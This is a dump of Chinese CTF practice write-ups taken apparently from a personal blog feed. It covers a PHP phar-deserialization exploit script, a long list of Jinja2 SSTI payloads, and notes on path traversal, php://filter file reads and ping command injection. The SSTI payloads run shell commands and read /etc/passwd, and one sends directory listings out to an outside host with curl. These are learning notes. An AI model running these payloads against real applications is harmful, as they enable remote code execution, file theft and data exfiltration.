href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt; &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt; file.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123; $show-&gt;source &#x3D; $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#39;file doesn\\&#39;t exists.&#39;); &#125; ?&gt; upload_file.php &lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; class.php &lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension &#x3D; end($temp); if(empty($extension)) &#123; &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; return false; &#125; &#125; &#125; ?&gt; class.php &lt;?php class C1e4r &#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str &#x3D; $name; &#125; public function __destruct() &#123; $this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test; &#125; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key &#x3D; $value; &#125; public function _show() &#123; if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123; die(&#39;hacker!&#39;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test &#123; public $file; public $params; public function __construct() &#123; $this-&gt;params &#x3D; array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value &#x3D; $this-&gt;params[$key]; &#125; else &#123; $value &#x3D; &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text &#x3D; base64_encode(file_get_contents($value)); return $text; &#125; &#125; ?&gt; 肯定是用这个函数来读取flag文件，但是没有反序列化的地方 所以这里要用phar反序列化 C1e4r类中有__destruct(), __destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。 函数中发现了echo，那么要利用echo $this-&gt;test。 show类有__toString(), __toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。 利用$this-&gt;str[&#39;str&#39;]-&gt;source; Test类有__get（） __get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。 利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value)); 利用C1e4r类的__destruct()中的echo this-&gt;test2.触发Show类的__toString()3.利用Show类的this-&gt;test2.触发Show类的__toString()3.利用Show类的content = $this-&gt;str[&#39;str&#39;]-&gt;source4.触发Test类的__get()5.成功利用file_get()`读文件 反序列化结果 &lt;?php class C1e4r &#123; public $test; public $str; &#125; class Show &#123; public $source; public $str; &#125; class Test &#123; public $file; public $params; &#125; $a &#x3D; new C1e4r(); $b &#x3D; new Show(); $c &#x3D; new Test(); $a -&gt;str &#x3D; $b; $b -&gt;str[&#39;str&#39;] &#x3D; $c; $c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;; $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的 $phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象 $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名 $phar-&gt;stopBuffering(); ?&gt; 生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行 看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问 得到flag 小tips：如果phar协议被过滤，可以试试用 compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F; 版本：7.4 + compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F; 版本：都可以 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ssti模板注入","slug":"ssti模板注入","date":"2021-06-25T04:19:20.000Z","updated":"2022-05-15T09:32:37.737Z","comments":true,"path":"2021/06/25/ssti模板注入/","link":"","permalink":"https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。","text":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。 ssti概述贴个大佬的文章 浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com) CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com) [关于python魔术方法payload：““.class.mro2].subclasses()40.read() 的解释_xiao__1bai的博客-CSDN博客 模板注入总结_Herbert_555的博客-CSDN博客 SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。 flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases__ 返回该对象所继承的基类 &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 flask基本知识 flask采用装饰器来指定路由，默认的模板渲染引擎为Jinja2。其中模板的三种主要语法为 ：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值 { % … % }:装载一个控制语句 :装载一个注释 流程： ​ 获取基本类 ​ 获取基本类的子类 ​ 找到重载过的__init__类 ​ 查看其引用__builtins__ ​ 调用其中可用的函数 获取基本类 ​ 利用__bases__或者是__mro__函数 &#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用 //实话实说最后一个不是很懂 获取基类的子类 ​ 利用__subclasses__函数 object.__subclasses__() &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类 SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用 我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号） 找到重载过的__init__类 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ &lt;unbound method WarningMessage.__init__ &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings) 可以查看当前位置， 查看其引用__builtins__ &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] 使用os模块执行命令来读取flag或者执行命令 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) &#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125; 来、姿势 1、config &#123;&#123;config&#125;&#125;可以获取当前 &#123;&#123;config&#125;&#125;可以获取当前设置，如果题目类似app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;），那可以直接访问&#123;&#123;config['FLAG']&#125;&#125;或者&#123;&#123;config.FLAG&#125;&#125;得到flag 2、self &#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config 3、&quot;&quot;、[]、()等数据结构 主要目的是配合__class__.__mro__[2]这样找到object类&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等 如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。 例如： &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; 常见的过滤绕过 (1)只过滤[] pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;) (2)过滤_ 利用request.args属性&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__将其中的request.args改为request.values则利用post的方式进行传参 (3)关键字过滤 base64编码绕过__getattribute__使用实例访问属性时,调用该方法 例如被过滤掉__class__关键词&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125; 字符串拼接绕过&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125;&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125; (4)过滤{ { 使用&#123;% if ... %&#125;1&#123;% endif %&#125;，例如 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; | grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125; 如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125; (5)引号内十六进制绕过 &#123;&#123;&quot;&quot;.__class__&#125;&#125; &#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]&#125;&#125; _&#96;是&#96;\\x5f&#96;，&#96;.&#96;是&#96;\\x2E (6)&quot; &#39; chr等被过滤，无法引入字符串 直接拼接键名 dict(buil&#x3D;aa,tins&#x3D;dd)|join() 利用string、pop、list、slice、first等过滤器从已有变量里面直接找 (app.__doc__|list()).pop(102)|string() 构造出%和c后，用格式化字符串代替chr &#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125; # uld&#x3D;%c &#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125; (7)+等被过滤，无法拼接字符串 ~在jinja中可以拼接字符串 格式化字符串同上 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125; wp搭了个靶场 level 1先找基本类 再获取基本类的子类 找到重载过的__init__类 &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125; 查看其引用__builtins__ 利用eval命令执行来读取flag &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125; level 2这个过滤了{ { ，所以要采用{ % % }的形式 { % % }内加控制语句 且这里展示数据要利用{ % print % } &#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125; 还有一种是利用控制语句 寻找符合条件的子类再利用WarningMessage的__bulitins__执行代码这个还不太懂先贴一下payload &#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; 补: &#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125; 要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令&lt;class ‘warnings.catch_warnings’&gt;一般位置为59，可以用它来调用file、os、eval、commands等 调用file &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() #把 read() 改为 write() 就是写文件 import os [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read() 调用eval [].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;) 调用system方法。（不包含system，可以绕过过滤system的情况） [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;) 利用commands进行命令执行 &#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125; level 3在学了在学了（ [GYCTF2020]FlaskApp题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码 试着访问app。py &#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这里可以看到过滤了一些内容 再查找目录内内容 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。 看见一个this_is_the_flag.txt 尝试去访问,得到flag &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125; &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 也可以利用切片的方式 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"}]},{"title":"buu刷题记录","slug":"buu刷题记录","date":"2021-06-16T20:26:18.000Z","updated":"2022-08-15T05:20:40.685Z","comments":true,"path":"2021/06/17/buu刷题记录/","link":"","permalink":"https://ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"记录一下自己buu的刷题进度，留下点wp方便以后看","text":"记录一下自己buu的刷题进度，留下点wp方便以后看 [HCTF 2018]WarmUp 进入后看到滑稽表情，查看源码看到有source.php 看到php代码 要求传入一个字符串类型的file，且需满足class emmm中的条件 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;]; 判断传入的参数是否为空，且是否为string类型 if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#39;t see it&quot;; return false; &#125; 判断传入的参数中是否有白名单内的内容 if (in_array($page, $whitelist)) &#123; return true; &#125; mb_substr()函数切割参数从0到第mb_strpos()函数返回的数值 $_page &#x3D; mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); 判断切割后的参数是否在白名单中 if (in_array($_page, $whitelist)) &#123; return true; &#125; 切割后的参数经过url解码后再进行一次过滤 $_page &#x3D; urldecode($page); $_page &#x3D; mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) if内为真时进行文件包含 &#123; include $_REQUEST[&#39;file&#39;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#125; 由于hint.php中提示flag在ffffllllaaaagggg中且whitelist中仅有source.php和hint.php 所以传入 file=hint.php?ffffllllaaaagggg 无回显 后多次利用../查看上级目录 最终payload为 file=hint.php?/../../../../ffffllllaaaagggg [极客大挑战 2019]Secret File进入后看到这个界面 查看源码可以找到Archive_room.php 发现这个页面 点击按钮后页面 尝试抓包发现secr3t.php 访问得到php代码 是文件包含，flag在flag.php中，过滤了../,tp,input,date. 利用php://filter绕过 构造file=php://filter/read=convert.base64-encode/resource=flag.php base64解码后得到flag 基础验证 进入后猜测用户名为admin 密码为123456进行抓包 发现存在一行Authorization: Basic YWRtaW46MTIzNDU2 猜测YWRtaW46MTIzNDU2为base64加密；进行解码 尝试通过bp用附件中的密码进行爆破， 为密码添加前缀为admin：且要进行base64加密的规则 爆破后发现存在一个长度不同与其他包的 进行发包查看其响应可发现flag 目录遍历进入后发现有四个目录， 依次寻找可找到flag.txt文件 ./ 表示当前目录../ 表示父级目录/ 表示根目录 目录遍历常见的是使用../来遍历目录 phpinfo进入后为这种页面 仔细查找后可发现flag 备份文件下载-网站源码 1.依次试试发现存在www.zip,下载压缩包后发现存在三个文件 查看flag的文件后发现其中不存在flag 尝试在网页中访问得到flag 2.御剑扫描 3.利用dirsearch工具扫描 python dirsearch.py -u http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/ -e* bak文件进入页面后 于是查看/index.php.bak 得到文件 vim缓存 所以查看.index.php.swp可得到文件 之后在Linux系统中用命令 vim -r index.php.swp打开 .DS_Store根据题目查看后缀.DS_Store 得到一个文件 用记事本就可以查看看到 可得到flag git泄露 log题目中为git泄露可直接在后缀后加/.git 也可用dirsearch扫 用githack进行查看（百度里有几个githack没有办法用，弄了一下午） githack要用python2 得到一个文件夹进入后用git bash打开 利用git log可以查看历史提交记录 看到有init ，add flag，remove flag三次提交记录 猜测flag在add flag中，用git diff命令对比与add flag的差别，可得到flag； [ACTF2020 新生赛]Exec查看源码后不存在提示，尝试ping 127.0.0.1 ping通后再尝试ping 127.0.0.1|ls 看到index.php 多次用../查看上级目录 看见有flag文件 尝试查看127.0.0.1|cat ../../../flag 得到flag 也可以用cat /flag 题目利用了命令执行 管道符 1、|（就是按位或），直接执行|后面的语句 2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 5、Linux中 ; 前后都执行，无论前面真假，同&amp;， [ACTF2020 新生赛]Include题目是include猜测是文件包含； 点击tips后跳转到了file=flag.php 用php://input时提示 然后尝试用php://filter 构造payload ?file=php://filter/read=convert.base64-encode/resource=flag.php 最后用base64解码就能得到flag [极客大挑战 2019]Knife文件可上传知道文件上传的路径上传文件可以被访问上传文件可以被执行 进去看到这个界面感觉是一句话木马，然后用菜刀连接 试一下 连接成功 然后在根目录下发现flag的文件，进入后找到flag [极客大挑战 2019]Http进去后看到是个广告页，直接查看源码 发现有个Secret.php，进入之后 用bp抓包然后先加个Referer: https://www.Sycsecret.com 看到要用Syclover 浏览器 所以把User-Agent里的内容改成User-Agent: Syclover 提示要本地访问 所以加个X-Forwarded-For:127.0.0.1（我下了个fakeip的插件） http请求报头请求报头通知服务器关于客户端求求的信息，典型的请求头有： X-Forwarded-For 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。 Referer：表示这是请求是从哪个URL进来的 Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机 User-Agent：发送请求的浏览器类型、操作系统等信息 Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息 Accept-Encoding：客户端可识别的数据编码 Accept-Language：表示浏览器所支持的语言类型 Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。 Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。 [GXYCTF2019]Ping Ping Ping进入后先根据题目试一下?ip=127.0.0.1 再用ls查看发现存在flag.php和index.php两个文件 尝试直接查看flag.php发现空格被过滤 绕过空格方式 $&#123;IFS&#125;替换 $IFS$1替换 $&#123;IFS替换 %20替换 &lt;和&lt;&gt;重定向符替换 %09替换 $IFS是bash中的内部域分隔符，可以代替空格至于后面的$9数字是可以随意的 发现利用$IFS$1可以绕过，但flag也被过滤了 于是先查看index.php 百度之后找到一种利用内联的payload ?ip&#x3D;127.0.0.1;cat$IFS$1 &#96;ls&#96; 